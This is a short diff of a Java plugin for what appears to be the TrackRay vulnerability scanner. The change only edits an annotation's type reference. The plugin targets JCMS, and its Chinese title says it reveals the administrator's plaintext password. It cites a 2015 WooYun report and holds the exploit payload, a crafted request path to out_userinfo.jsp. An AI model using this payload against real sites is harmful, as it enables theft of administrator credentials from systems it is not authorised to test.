@@ -9,7 +9,7 @@ import com.trackray.base.plugin.CommonPlugin;
 
 import java.util.Map;
 
-@Rule(params = {@Param(key = "target", desc = "目标地址"),} , type = AbstractPlugin.Type.HTML)
+@Rule(params = {@Param(key = "target", desc = "目标地址"),} , type = CommonPlugin.Type.HTML)
 @Plugin(title = "JCMS爆管理员明文密码 " , link = "http://www.anquan.us/static/bugs/wooyun-2015-095221.html", author = "浅蓝" )
 public class PasswordRead extends CommonPlugin{
     String payload = "/interface/user/out_userinfo.jsp?xmlinfo=%3Cmain%3E%3Cstatus%3EQ%3C/status%3E%3C/main%3E";
